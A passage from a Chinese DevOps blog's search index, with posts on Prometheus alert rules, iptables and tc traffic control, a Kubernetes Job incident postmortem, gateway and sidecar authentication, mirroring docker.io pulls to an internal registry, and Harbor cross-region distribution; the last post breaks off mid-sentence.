0\nKafka 存在复制不足的分区 avg_over_time(kafka_server_replicamanager_underreplicatedpartitions{}[1m])\n阈值：\u0026gt;=1\nKafka 存在没有领导者的分区 avg_over_time(kafka_controller_kafkacontroller_offlinepartitionscount{}[1m])\n阈值：\u0026gt; 0\nKafka 集群中控制器的数量等于 0 sum by(cluster_name) (avg_over_time(kafka_controller_kafkacontroller_activecontrollercount{}[2m]))\n阈值：=0\nKafka brokers数量不足 kafka_brokers{}\n阈值：=0\nZookeeper instance is down zk_up{}\n阈值：=0\nZookeeper 连接数过高 zk_num_alive_connections{}\n阈值：\u0026gt; 100\nZookeeper 超出服务器处理能力的排队请求数量 zk_outstanding_requests{}\n阈值：\u0026gt;100\nZookeeper服务器响应客户端请求花费的平均时间过长(ms) zk_avg_latency{}\n阈值：\u0026gt;100\nEtcd Etcd Server has no leader etcd_server_has_leader{}\n阈值：= 0\nEtcd proposls failed num \u0026gt; 10 within 2min increase(etcd_server_proposals_failed_total{}[2m])\n阈值：\u0026gt;10\nEtcd Disk fsync durations \u0026gt; 500ms histogram_quantile(0.99, sum by(instance,le,cluster_name) (rate(etcd_disk_wal_fsync_duration_seconds_bucket{}[2m])))\n阈值：\u0026gt; 0.5\nEtcd Disk commit durations \u0026gt; 250ms histogram_quantile(0.99, rate(etcd_disk_backend_commit_duration_seconds_bucket{}[2m]))\n阈值： \u0026gt; 0.25\nEtcd leader changes num \u0026gt; 2 within 5min increase(etcd_server_leader_changes_seen_total{}[5m])\n阈值：\u0026gt; 2\nEtcd DB 使用空间超过85% etcd_mvcc_db_total_size_in_bytes{} / etcd_server_quota_backend_bytes{}\n阈值：\u0026gt; 0.85\n参考 https://help.aliyun.com/document_detail/176180.html#section-78l-udp-gcs https://blog.csdn.net/weixin_43798031/article/details/123430196 ","description":"","id":145,"section":"post","tags":["Prometheus","告警","整理"],"title":"常用的各类资源 Prometheus 告警语句","uri":"https://www.chenshaowen.com/blog/some-common-promql-for-alarming.html"},{"content":"1. 主机服务端口 1 2 iptables -I INPUT -p tcp --dport 80 -j DROP iptables -I INPUT -p tcp -s 1.2.3.4 --dport 80 -j ACCEPT 这里仅允许 1.2.3.4 访问本地主机的 80 端口。\n2. Docker 服务端口 对于类似 docker run -d -p 80:80 shaowenchen/demo-whoami 运行的服务，上面的方法无效，需要在 DOCKER-USER 链中添加规则。\nDocker 会将 iptables 规则添加到 DOCKER 链中，如果需要在 Docker 之前添加规则需要添加到 DOCKER-USER 链中\n1 iptables -I DOCKER-USER -i ens192 ! -s 1.2.3.4 -p tcp --dport 80 -j DROP ens192 是本地的网卡，这里仅允许 1.2.3.4 访问本地主机的 80 端口。\n3. 清理环境 1 2 yum install -y iptables-services systemctl restart iptables.service 如果需要在主机重启之后 iptables 设置，依然有效，需要安装 iptables-services 并保存\n1 2 yum install -y iptables-services service iptables save 4. 参考 https://docs.docker.com/network/iptables/ ","description":"","id":146,"section":"post","tags":["博文","Docker","Linux","安全","限制"],"title":"如何设置端口仅对指定 IP 开放访问","uri":"https://www.chenshaowen.com/blog/set-port-to-be-accessible-only-to-a-specified-ip.html"},{"content":"1. Linux 下的流量控制原理 通过对包的排队，我们可以控制数据包的发送方式。这种控制，称之为数据整形，shape the data，包括对数据的以下操作:\n增加延时 丢包 重新排列 重复、损坏 速率控制 在 qdisc-class-filter 结构下，对流量进行控制需要进行三个步骤:\n创建 qdisc 队列 上面提到 Linux 是通过包的排队进行流量的控制，那么首先得有一个队列。\n创建 class 分类 class 实际上，就是划分流量策略分类。比如划分两档流量限速 10MBps、20MBbs。\n创建 filter 过滤 虽然创建了 class 分类，但是并没有将任何的 IP、Port 绑定到 class 上，此时并不会有控制作用。还需要创建 filter 将指定的 IP、Port 绑定到 class 上，才能使流量控制 class 生效于资源。\nTC 是 Linux 下提供的流量控制工具，也是 Cilium/eBPF 等网络组件的核心基础设施之一。\n2. 限制指定 IP、Port 对本机的访问速度 2.1 查看网卡 1 2 3 4 5 6 7 8 9 10 ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 1.1.1.1 netmask 255.255.254.0 broadcast 1.1.1.1 inet6 1::1:1:1:1 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 1:1:1:1:1:1 txqueuelen 1000 (Ethernet) RX packets 2980910 bytes 2662352343 (2.4 GiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1475969 bytes 122254809 (116.5 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 2.2 配置 qdisc-class-filter 创建 qdisc 根队列 1 tc qdisc add dev eth0 root handle 1: htb default 1 创建第一级 class 绑定所有带宽资源 注意这里的单位是 6 MBps，也就是 48 Mbps。\n1 tc class add dev eth0 parent 1:0 classid 1:1 htb rate 6MBps burst 15k 创建子分类 class 可以创建多个子分类，对资源的流量进行精细化管理。\n1 tc class add dev eth0 parent 1:1 classid 1:10 htb rate 6MBps ceil 10MBps burst 15k 这里 ceil 设置的是上限，正常情况下限速为 6MBps，但网络空闲时，可以达到 10 MBps。\n创建过滤器 filter，限制 IP 1 tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match ip dst 1.2.3.3 flowid 1:10 这里对 1.2.3.4 进行限制带宽为 1:10，也就是 6MBps。当然，你也可以直接给网段 1.2.0.0/16 加 class 策略。\n2.3 查看并清理配置 查看 class 配置 1 2 3 4 tc class show dev eth0 class htb 1:10 parent 1:1 leaf 10: prio 0 rate 48Mbit ceil 80Mbit burst 15Kb cburst 1600b class htb 1:1 root rate 48Mbit ceil 48Mbit burst 15Kb cburst 1590b 查看 filter 配置 1 2 3 4 5 6 tc filter show dev eth0 filter parent 1: protocol ip pref 1 u32 chain 0 filter parent 1: protocol ip pref 1 u32 chain 0 fh 800: ht divisor 1 filter parent 1: protocol ip pref 1 u32 chain 0 fh 800::800 order 2048 key ht 800 bkt 0 flowid 1:10 not_in_hw match 01020303/ffffffff at 16 清理全部配置 1 tc qdisc del dev eth0 root 3. 限制本机对指定 IP、Port 的访问速度 由于排队规则主要是基于出口方向，不能对入口方向的流量（Ingress）进行限制。因此，我们需要将流量重定向到 ifb 设备上，再对 ifb 的出口流量（Egress）进行限制，以最终达到控制的目的。\n3.1 启用虚拟网卡 加载 ifb 设备 1 modprobe ifb numifbs=1 启用 ifb0 虚拟设备 1 ip link set dev ifb0 up 3.2 配置 qdisc-class-filter 添加 qdisc 1 tc qdisc add dev eth0 handle ffff: ingress 如果是出口流量，可以使用 egress; 这里是入口流量，使用 ingress。\n重定向网卡流量到 ifb0 1 tc filter add dev eth0 parent ffff: protocol ip u32 match u32 0 0 action mirred egress redirect dev ifb0 添加 class 和 filter 1 2 3 4 tc qdisc add dev ifb0 root handle 1: htb default 1 tc class add dev ifb0 parent 1:0 classid 1:1 htb rate 600Mbps ceil 600Mbps tc class add dev ifb0 parent 1:1 classid 1:10 htb rate 6Mbps ceil 6Mbps tc filter add dev ifb0 parent 1: protocol ip prio 16 u32 match ip src 1.2.3.4/32 flowid 1:10 3.3 查看并清理配置 下面是限速本机对指定 IP 访问的监控图 进入的流量被限制在 6 MBps 以下，而出去的流量不被限制。\n查看 class 配置 1 2 3 4 tc class show dev ifb0 class htb 1:10 parent 1:1 prio 0 rate 48Mbit ceil 48Mbit burst 1590b cburst 1590b class htb 1:1 root rate 48Mbit ceil 48Mbit burst 1590b cburst 1590b 查看 filter 配置 1 2 3 4 5 6 tc filter show dev ifb0 filter parent 1: protocol ip pref 16 u32 chain 0 filter parent 1: protocol ip pref 16 u32 chain 0 fh 800: ht divisor 1 filter parent 1: protocol ip pref 16 u32 chain 0 fh 800::800 order 2048 key ht 800 bkt 0 flowid 1:10 not_in_hw match 01020304/ffffffff at 16 清理全部配置 1 2 3 tc qdisc del dev eth0 ingress tc qdisc del dev ifb0 root modprobe -r ifb 4. 参考 https://arthurchiao.art/blog/lartc-qdisc-zh/ https://serverfault.com/questions/350023/tc-ingress-policing-and-ifb-mirroring ","description":"","id":147,"section":"post","tags":["博文","Linux","TC","流量控制"],"title":"使用 Linux TC 进行流量限制","uri":"https://www.chenshaowen.com/blog/traffic-restriction-using-linux-tc.html"},{"content":"1. 相关背景 早上 10:00 因同事需求，我通过工具在集群上创建 Kubernetes Job 执行任务。\n工具创建 Job 时，会拿到集群上的全部节点，然后逐个绑定节点创建 Job。例如，如下集群:\n1 2 3 4 5 6 7 8 9 10 kubectl get node NAME STATUS ROLES AGE VERSION node2 Ready control-plane,master,worker 64d v1.16.11 node3 Ready control-plane,master,worker 64d v1.16.11 node4 Ready control-plane,master,worker 64d v1.16.11 node5 Ready worker 64d v1.16.11 node6 Ready worker 64d v1.16.11 node7 NotReady,SchedulingDisabled worker 64d v1.16.11 node8 NotReady,SchedulingDisabled worker 64d v1.16.11 那么工具会创建 7 个 Job。由于有些集群中，master 节点是不允许调度的，在 Job 中容忍设置了 TaintEffectNoSchedule 容忍不可调度的节点。\n这里的 node7、node8 节点实际上已经关机。\n2. 事故时间线 按照预期，执行完工具的 Job 创建命令，应该就完事了。但是故事才刚刚开始:\n10:31:02 告警系统提示，节点 CPU 5分钟负载过高 通过 top 命令，很快就发现是 kube-controller-manager 占用了太多 CPU。联想到 10:00 的变更，很快我就发现莫名创建了很多 Pod，怀疑是 Pod 太多导致 kube-controller-manager 压力过大。\n10:39:00 开始清理 Pod 这一步才是噩梦的开始。从监控数据看，在事故前半个小时，机器的 CPU 负载是缓慢上升，当开始清理 Pod 时，机器完全失去了响应。\n原因是，使用了 kubectl delete pod 清理 Pod。由于 kubectl 是通过 kube-apiserver 修改 etcd，然后 kube-controller-manager 异步完成删除任务。\n但问题的关键在于，有近 3W Pod，而 master 节点只有 2C4G 的配置。瞬间删除 3W Pod 引发 kube-controller-manager、Etcd 高负载直接让节点失去了响应。从监控图的 CPU 使用率看就是这样:\nCPU 使用率表示的是对 CPU 的利用率，而 CPU 负载表征的是 CPU 的繁忙程度。比如，很多低计算密度的任务，就可能会导致 CPU 使用率低，CPU 负载很高。这里 CPU 使用率的监控数据直接就没了，说明 Prometheus 从主机的 exporter 已经拉取不到数据。\n11:05:00 开始陆续扩容 master 节点 集群上有 3 台 master, kube-controller-manager 会进行选主，每台 master 上都部署了 etcd，因此全部 master 节点都需要升配置，直接拉到云厂允许的最高配置。\n需要注意的是，不要三台同时升级，等一台就绪之后再升级另外一台，因为集群上还有很多负载。\n11:18:00 升配完成，但依然报错 kube-controller-manager、Etcd 持续报错，但没有影响工作负载。\n12:24:00 直接操作 etcd 清理 Pod 恢复集群 由于忽略了 Pod 的数量级，采用 kubectl 删除 Pod、Namespaces 一直不成功，kube-controller-manager、Etcd 持续报错。虽然 master 节点的配置已经升级至很高，但依然不能解决问题。在此，停留排查了很久，没有思路。最后想起来，完全失去响应是在开始删 Pod，才找到思路，直接删除 Etcd 数据。之前写的一篇文档里面有 Etcd 相关的一些操作配置: Etcd、Etcdctl 应用实践\n执行一下命令，批量删除 xxx 命名空间下的 Pod 就解决了问题:\n1 2 etcdctl del /registry/namespaces/xxx etcdctl del /registry/pods/xxx --prefix 3. 反省 清理环境 线上的运维操作要谨慎，不仅要保障结果的准确性，还要尽量消除变更之后的影响。\n这里疏忽的点是，没有清理 Job。如果清理了 Job，可能就不会有问题。\nKubernetes Job 需要设置 backoffLimit 实际上在 Kubernetes 1.16、master 代码分支上，都能看到默认的 backoffLimit 是 6，也就在会 Job 会重试 6 次，最多执行 7 次。工具在创建 Job 时，遗漏了这个参数:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: batch/v1 kind: Job metadata: name: error-ret spec: template: spec: containers: - name: error-ret image: alpine command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;exit 1\u0026#34;] restartPolicy: Never tolerations: - key: \u0026#34;node.kubernetes.io/not-ready\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; nodeName: node7 # backoffLimit: 4 但在关机的节点上，默认的 backoffLimit 并未生效，而是以极快的速度不停创建 Pod，一个多小时两个 Job 重试共达到近 3W 次。\n有待复现继续跟踪 场景不太好复现，Kubernetes 1.16、多 Master 节点、Worker 节点关机、Job 不设置 backoffLimit、Job 直接设置 nodeName，还在实验中，后续继续跟进。\n","description":"","id":148,"section":"post","tags":["Kubernetes","Job","Pod","事故","博文"],"title":"Kubernetes Job 创建了近 3W Pod，差点导致严重事故","uri":"https://www.chenshaowen.com/blog/kubernetes-job-create-3w-pod-attack-cluster.html"},{"content":"1. 异构系统带来的认证鉴权问题 企业系统，可以分为以下几种类型：\n购买的商业软件，比如 JumpServer 开源的软件，比如 Kibana、Grafana 自主研发的软件，比如应用管理平台 这里需要说明的是，认证和鉴权是两个功能:\n认证，证明你是你 鉴权，你是管理员，而不是普通用户 针对上面的系统，在接入认证鉴权时，主要面临如下问题:\n自主定制成本高，而社区支持响应慢。定制开源组件需要投入大量人力，直接对其进行定制是不合时宜的，而将需求提交到社区等待解决方案，周期太长，难解燃眉之急 自研系统一个一个对接认证鉴权成本很高。每一个自研系统都需要实现一套类似的逻辑，校验登录态，验证权限规则 老的系统接入困难。有些老的服务相关人员离职，几乎没人维护但又有人在使用，改不动 对于商业购买的软件，在采购时就可对接入成本、安全性等进行评估，常常能够满足认证鉴权的需求。\n而在大型企业中，不同的部门总是习惯性建设一套自己熟悉的认证鉴权系统，导致部门与部门之间的系统割裂，形成一个一个的烟囱壁垒，信息无法在内部自由流动。这给员工带来极大不便、大大降低工作效率，削弱企业在市场上的竞争力。\n统一的认证鉴权体系是有必要的。公共的功能，通过服务化的形式提供给大家使用，不仅可以避免重复开发，还可以享受更优质的职能化服务。\n2. 服务的域名策略 在进行登录态验证时，通常会需要获取 HTTP 请求的 Cookie。而 Cookie 的作用范围是和域名直接相关的。因此在聊统一认证鉴权之前，先了解一下服务的域名策略。\n2.1 多域名多服务 为了服务之间彻底隔离，减小每次变更的影响范围，会采用多域名策略。示例如下：\nharbor.oa.com c.domain.com www.chenshaowen.com 一个服务一个域名，减小了故障的爆炸半径，但也在管理上增加了很大成本，比如证书、DNS 配置等。如果没有统一的管理平面，这些复杂度的增加必然会增加人为失误、犯错的概率。控制复杂度是每个优秀的工程师必须掌握的技能。\n统一的域名有利于树立良好的品牌形象。混乱的域名使用，会导致用户品牌识别度降低，误将李鬼当李逵，让黑产有机可乘。同时，多域名也不利于 SEO，分散服务在搜索引擎上的打分，降低排名。\n因此，域名不要太多，在启用新域名之前，多思考能不能不用，采用尽可能少的原则使用。\n在多域名策略下，我们只能以第三方登录的形态接入统一登录系统。每个系统申请一套接入凭证，然后各自进行对接。\n2.2 单一域名多 Location 采用同一个域名，不同 Location 对应不同服务，是我推荐的一种做法。\ndomain.com/grafana/ domain.com/oa/ domain.com/c/ domain.com/c-test/ 用户好记，研发也不用再苦恼于配置 Hosts，采用多域名时，每个服务配置一个 Hosts，甚是麻烦。\n入口统一易于维护。多入口、多管理平面都是架构、运维能力弱的表现。谁都不会拒绝简单，直观、简洁、所见即所得是我们在设计系统时不断追求的目标。\n由于采用单域名，这些系统之间的 Cookie 是共享的。因此只需要在该域名下写下登陆态 Cookie，用户使用其他系统时，也将处于登录状态。其他系统无需完成登录逻辑，只需要后台校验登陆态，再进行鉴权即可。\n3. 通过七层 forward-auth 接入认证鉴权 如上图，无论是对于商业、自研、开源的软件，我们都可以通过七层网关统一认证鉴权。\n下面是访问流程:\n四层网关卸载证书。首先是 ELB 卸载 HTTPS 证书，统一接管用户的域名流量。当然，如果想限制访问来源，你还可以进行 IP 白名单限制。 七层网关路由。七层网关会对每一个 http 进行鉴权，获取用于认证的字段，这些字段可以是 Header 中的 JWT Token，也可以是整个 Cookie。对于没有通过 forward-auth 认证检测的请求，将会直接被拒绝。 进入业务系统。此时的用户已经完成了认证，但是缺少鉴权。如果是商业或者开源软件，可以通过 LDAP、Basic 二次认证之后，再获取角色权限。如果是自研的系统，可以在中间件中写鉴权逻辑，拿到用户 ID，请求统一的鉴权中心进行鉴权。 值得高兴的是，有些网关已经提供了这样的功能，比如 Apisix 的 forward-auth 插件，Traefik 的 forward-auth 中间件等，我们直接使用即可。下面是 forward-auth 需要实现的功能:\n当有流量经过网关时，forward-auth 需要向指定的鉴权接口，发送一个请求，如果请求返回的是 200，那么放行流量；如果请求返回的是非 200，那么将进行重定向，将流量引导至认证页面。下面是在 Apisix 中给 forward-auth 的一段配置，以供大家参考:\nApisix 中 forward-auth 插件是 lua 编写，可以根据需要进行修改。比如，需要增加鉴权逻辑，只需要将 UID 和资源定位符 URI 传给统一的鉴权中心即可。\n4. 通过 sidecar 接入认证鉴权 上面这种方式，我们是将认证放在了接入层，对业务系统没有任何改造。但是这种方式存在一个风险，如果绕过网关，就可以绕过认证。\n在网关上实现的 forward-auth 认证的是南北向流量，即用户直接访问业务系统的流量。但这却无法控制东西向流量，其他服务依然可以对受控服务进行访问。另一种方式是，采用 Sidecar 进行认证鉴权，如下图:\n我们需要开发一个 Sidecar，下沉网关层的 forward-auth，代理全部访问流量，进行统一认证鉴权之后再转发至受控业务。\n这样就需要在每个受控系统上，部署一个 Sidecar。此时，用户请求的流量应该转发给 Sidecar 而不是业务本身。\n5. 总结 本文主要思考的是在异构的系统下，如何快速接入统一的认证鉴权体系。\n认证是证明你是你，而鉴权是证明你有权限这样做。在已有一套统一的认证鉴权系统的前提下，这里提供了两种快速接入的思路:\n第一种是，采用网关层的 forward-auth，对业务无任何入侵，在接入层完成认证鉴权。通过后端 Middleware 二次验证，能够提供进一步的安全验证。\n第二种是，采用 Sidecar 拦截受控业务的流量，进行认证鉴权之后，再转发流量。这种方式具有一定的开发量，但 Sidecar 可以复用，对业务代码没有入侵。其实，很多 Middleware 实现的功能都可以使用 Sidecar 实现，将开发成本转移到运维部署层面，当基础设施是 Kubernetes 时，我们又可以借助于 kube-apiserver 的准入控制 Webhook 实现自动注入，达到一次开发永久零成本使用的效果。\n6. 参考 https://apisix.apache.org/zh/docs/apisix/plugins/forward-auth/ ","description":"","id":149,"section":"post","tags":["博文","认证","鉴权"],"title":"如何快速接入统一的认证鉴权体系","uri":"https://www.chenshaowen.com/blog/how-to-access-a-unified-auth-system-quickly.html"},{"content":"\n1. 自签 *.docker.io 域名证书 1.1 创建 CA 证书 生成 CA 证书私钥 1 openssl genrsa -out ca.key 4096 生成 CA 证书 1 2 3 4 openssl req -x509 -new -nodes -sha512 -days 3650 \\ -subj \u0026#34;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=chenshaowen.com\u0026#34; \\ -key ca.key \\ -out ca.crt 1.2 创建 *.docker.io 域名证书 生成私钥 1 openssl genrsa -out docker.io.key 4096 生成证书签名请求 CSR 1 2 3 4 openssl req -sha512 -new \\ -subj \u0026#34;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=*.docker.io\u0026#34; \\ -key docker.io.key \\ -out docker.io.csr 生成 x509 v3 扩展 1 2 3 4 5 6 7 8 9 10 11 cat \u0026gt; v3.ext \u0026lt;\u0026lt;-EOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1=docker.io DNS.2=*.docker.io EOF 生成 *.docker.io 域名证书 1 2 3 4 5 openssl x509 -req -sha512 -days 3650 \\ -extfile v3.ext \\ -CA ca.crt -CAkey ca.key -CAcreateserial \\ -in docker.io.csr \\ -out docker.io.crt 1.3 查看生成的全部文件 1 2 3 ls ca.crt ca.key ca.srl docker.io.cert docker.io.crt docker.io.csr docker.io.key v3.ext 2. 部署 Registry 并配置 HTTPS 证书 2.1 部署 Nginx 代理转发 HTTPS 流量 这里配置一个 Nginx 卸载 HTTPS 证书，用于转发 *.docker.io 域名的请求到 Registry。\n参考：https://github.com/shaowenchen/docker-compose/tree/main/nginx\n需要使用到上面生成的证书文件: docker.io.crt，docker.io.key。\n2.2 部署 Docker.io 的代理 Registry 创建一个 mirror 目录 1 2 mkdir mirror cd mirror 编辑配置文件 1 vim config.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 version: 0.1 log: fields: service: registry storage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registry http: addr: :5000 headers: X-Content-Type-Options: [nosniff] health: storagedriver: enabled: true interval: 10s threshold: 3 proxy: remoteurl: https://registry-1.docker.io 在 5000 端口启动 1 mkdir data 1 2 3 4 docker run -d -p 5000:5000 --restart=always --name mirror \\ -v `pwd`/config.yml:/etc/docker/registry/config.yml \\ -v `pwd`/data:/var/lib/registry \\ registry:2 2.3 部署私有仓库的 Registry 创建一个 harbor-mirror 目录 1 2 mkdir harbor-mirror cd harbor-mirror 编辑配置文件 1 vim config.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 version: 0.1 log: fields: service: registry storage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registry http: addr: :5000 headers: X-Content-Type-Options: [nosniff] health: storagedriver: enabled: true interval: 10s threshold: 3 proxy: remoteurl: https://private.chenshaowen.com username: [username] password: [password] 这里的 [username]、[password] 需要替换为私有仓库的凭证。\n在 5002 端口启动 1 mkdir data 1 2 3 4 docker run -d -p 5002:5000 --restart=always --name harbor-mirror \\ -v `pwd`/config.yml:/etc/docker/registry/config.yml \\ -v `pwd`/data:/var/lib/registry \\ registry:2 3. 给访问镜像仓库的主机添加证书 这里直接将 ca.crt 添加到受到信任证书链，以此 CA 证书签发的域名证书都将被信任。当然，你也可以一个一个地将自签发的证书添加到信任列表。这里将 ca.crt 重命名，以方便识别和区分:\n1 cp ca.crt chenshaowen.com.ca.crt 3.1 Ubuntu 系统 添加 1 2 cp chenshaowen.com.ca.crt /usr/local/share/ca-certificates update-ca-certificates 删除 1 2 rm -f /usr/local/share/ca-certificates/chenshaowen.com.ca.crt update-ca-certificates 3.2 CentOS 系统 添加 1 cp chenshaowen.com.ca.crt /etc/pki/ca-trust/source/anchors/ 1 update-ca-trust extract 删除 1 2 3 rm /etc/pki/ca-trust/source/anchors/chenshaowen.com.ca.crt update-ca-trust extract 3.3 需要重启 Docker，才会重新加载根证书 1 systemctl restart docker 4. 测试验证 这里将设 Nginx 代理的主机 IP 为 1.1.1.1，那么在访问镜像的主机上都需要加上解析或者配置 /etc/hosts:\n1 2 1.1.1.1 docker.io 1.1.1.1 registry-1.docker.io 并且测试主机应该信任 ca.crt 或者 docker.io.crt 证书。\n4.1 代理 docker.io 流量 此时，将 Nginx 的流量代理到 5000 端口，也就是直接访问 dockerhub 上的镜像。\n拉取公开镜像 1 docker pull jenkins/jenkins 能够拉取成功\n查看本地缓存文件 1 2 3 du -sh data/ 169M\tdata/ 4.2 代理私有镜像仓库流量 修改 Nginx 配置，将后端流量切换到私有镜像仓库的 5002 端口，此时后端对接的是私有 Harbor 镜像仓库。\n拉取私有镜像测试 如果直接访问私有镜像仓库，那么地址应该是 private.chenshaowen.com/okscloud/test:develop ，但是这里我们可以直接去掉域名前缀拉取镜像:\n1 docker pull okscloud/test:develop 可以拉取成功，此时的 docker.io 指向的是 Registry ，最终被代理到 private.chenshaowen.com。\n查看镜像缓存 1 2 3 du -sh /diskb/harbor-mirror 676M\t/diskb/harbor-mirror 5. 总结 本文主要是验证了一个想法，在内网通过修改 docker.io 的解析指向 Registry 代理，劫持 dockerhub 的镜像流量。这种劫持的意义在于：\n审计内网对 dockerhub 的镜像依赖 更好的镜像加速，利用 Dragonfly 等 摆脱国内 docker.io 访问限速、不稳定的困扰 ","description":"","id":150,"section":"post","tags":["博文","Jenkins","Kubernetes"],"title":"如何劫持 docker.io 的镜像流量到私有仓库","uri":"https://www.chenshaowen.com/blog/hijack-docker-io-req-to-private-repository.html"},{"content":"1. Harbor 跨区带来的挑战 如果只是简单的存放镜像数据， Registry 作为镜像仓库会是一个很好的选择。Registry 不仅支持多种存储后端，还可以配置 HTTPS 证书，访问凭证。值得一题的是，Harbor 也是使用 Registry 存储镜像数据。\n如果团队需要进行角色管理，存储控制，对接 LDAP 认证等功能，可以使用 Harbor。只需要一台 4C8GB 的机器，外置高可用 PGSQL、对象存储，就足够支撑数十个 Kubernetes 集群、数百个 VM 节点，打通 CI、CD 镜像交付流程。\n通过堆砌内存、CPU 等资源，单实例的 Harbor 也足够支撑上百集群、数千节点。另一个重要的优化点是，当后端采用 Obs 等对象存储时，上传和下载镜像层数据将会直接请求对象存储桶，而不会给 Harbor 造成过大的流量负担。受益于对象存储的全球加速，上下行速度很容易达到 200+ Mbps，甚至 1Gbps 的带宽。\n但也仅限于此，Harbor 只适合单区，而不能满足跨区场景下的镜像管理。如下图，当服务需要部署在多个区域，区域与区域之间通过公网互联，一旦区域网络被所在国家管制、处于不稳定状态，Harbor 在这种场景下就会束手无策。\n同时，低效的 Harbor 任务队列，让多 Harbor 同步方案失去了实效性。一个区域推送完，另外一个区域需要等待十几个小时才可能同步完成，应用才允许更新。这是无法容忍的，参考: harbor-的一些问题 。\n在多区域场景下，单实例 Harbor 不能够支撑全区的镜像流量需求。一方面是跨区的网络不够稳定、流量费用高，另一方面还在于扩展性，IT 基础设施不支持不停地增加区域，所有负载拉取同一个 Harbor 不可靠。\n2. 为什么不采用 Dragonfly 等分发方案 2.1 Dragonfly 简介 Dragonfly 是很多人所推荐的镜像分发工具，但是我没有找到符合场景的案例。\nDragonfly 的文档结构并不算很清晰，我理解的 Dragonfly 可以分成两部分:\nDfdaemon Dfdaemon 与 Docker 官方 Registry 的 Mirror 功能类似，用来代理镜像层流量。这一部分是可以单独使用的，并不依赖于其他组件。\n分发网络 分发网络是 Dragonfly 的核心功能，V1 版的组件是 Supernode，V2 版的组件是 Scheduler、Manager 等。类似于我们使用 P2P 工具下载大文件，Dragonfly 构建了一个专门给镜像加速的内部网络。而这个分发网络的下载客户端就是 Dfclient，也叫 Dfdaemon 。\n2.2 使用 Mirror 加速镜像的原理 由于 Dragonfly V1 和绝大多数网上的文章都是通过配置 Mirror 加速镜像下载。在聊 Dragonfly 的问题之前，我们先说下 Docker Mirror 加速的原理。\n通过查阅源码，可以得到如下片段：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func (s *DefaultService) lookupV2Endpoints(hostname string) (endpoints []APIEndpoint, err error) { tlsConfig := tlsconfig.ServerDefault() if hostname == DefaultNamespace || hostname == IndexHostname { for _, mirror := range s.config.Mirrors { endpoints = append(endpoints, APIEndpoint{ URL: mirrorURL, Version: APIVersion2, Mirror: true, TrimHostname: true, TLSConfig: mirrorTLSConfig, }) } endpoints = append(endpoints, APIEndpoint{ URL: DefaultV2Registry, Version: APIVersion2, Official: true, TrimHostname: true, TLSConfig: tlsConfig, }) } 地址: https://github.com/docker/docker-ce/blob/8bb27fc680463da975f386e3a325fe4d52b05f8e/components/engine/registry/service_v2.go\n这里的 DefaultNamespace = \u0026quot;docker.io\u0026quot;、IndexHostname = \u0026quot;index.docker.io\u0026quot;，意味着 Mirror 实际上只对 Docker 官方提供的镜像生效。\n而这种特性在 Docker 官方文档中，也给出了明确说明 It’s currently not possible to mirror another private registry. Only the central Hub can be mirrored.，参考: https://docs.docker.com/registry/recipes/mirror/ 。\n在 https://github.com/distribution/distribution/issues/1483 中，开发者对这一特性进行了补充说明，私有仓库不能使用 Mirror 的原因在于: 私有仓库源将导致本地命名空间冲突、镜像管理上的混乱，因此仅限于单一的官方 docker.io 仓库镜像，不能对私有仓库进行加速。\n2.3 配置代理才能利用 Dragonfly V2 加速私有镜像 加速的困境 由于 Mirror 只能加速 Docker 官方镜像，这与私有镜像仓库的场景不符。让人困惑的是，为什么网上那么多文章都是通过 Mirror 这种方式进行加速，竟然还能配合 Harbor 私有仓库使用。\n如果仅仅只是加速 Docker 官方镜像层数据，那么加速的效果就会大打折扣。由于采用分阶段构建，业务的运行时采用 docker.io 上的 alpine 基础镜像，通常只有几到几十 MB。而业务相关的依赖包、二进制、图片、JS、CSS、Jar、WASM 包占整个镜像数据很大比例。\n正确的加速方式是配置代理 在 Dragonfly V2 官方文档针对不同的运行时，给出了加速方案，但针对私有仓库时，并不是通过配置 Mirror，而是给 Docker 配置 HTTP_PROXY、HTTPS_PROXY。\n除非在安装 Containerd 时就已经配置好 HTTPS_PROXY，我想没人愿意冒着风险直接线上修改。何况还不一定开启了 Live Restore 特性，而这一特性对 Containerd 版本也有要求。\n3. 其实也能通过 Mirror 加速私有镜像 前面说过不能通过配置 Mirror 加速私有镜像。但经过思考，我还是找到了一种可行的方案。虽然并没有被真实采用，还是写下来以供大家参考。\n3.1 思路 无论是 docker.io 还是 Harbor 搭建的私有镜像仓库，都遵循同一套接口规范。这给我们通过修改 DNS 记录，将私有镜像仓库的流量切换到 docker.io 域名下提供了可能。\n3.2 具体步骤 假设内网的镜像仓库名为 private.chenshaowen.com，IP 地址为 1.2.3.4。\n第一步，在业务所在内网，添加 DNS 记录将 docker.io 指向 1.2.3.4\n第二步，切换镜像服务指向为 docker.io。\n完整的镜像名是 private.chenshaowen.com/project/biz:v1 ，实际上如果添加了等价域名之后，我们还可以使用 private-peer-a.chenshaowen.com/project/biz:v1、private-peer-b.chenshaowen.com/project/biz:v1 拉取。镜像格式中的域名只是指示服务，服务的域名是可以随意更换的，只需要重新认证鉴权，并不会影响镜像的推送和拉取。\n由于 private.chenshaowen.com 和 docker.io 指向的都是 1.2.3.4，因此我们可以使用 docker.io/project/biz:v1 替换 private.chenshaowen.com/project/biz:v1。\n如上图，部署业务应用时，虽然使用的是 docker.io 镜像，但是却是向私有仓库请求镜像数据。但这并没有加速的效果，因此需要使用 Dragonfly 